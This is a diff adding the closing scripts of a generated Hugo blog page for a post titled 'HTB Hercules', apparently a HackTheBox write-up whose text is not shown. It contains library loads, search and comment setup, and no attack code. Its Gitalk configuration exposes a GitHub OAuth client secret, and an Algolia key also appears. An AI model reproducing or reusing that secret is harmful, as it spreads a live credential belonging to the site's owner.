+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "HTB Hercules",
+          url: "http:\/\/localhost:1313\/post\/htb-hercules\/",
+          description: "HackTheBox篇Season 9系列之Hercules",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
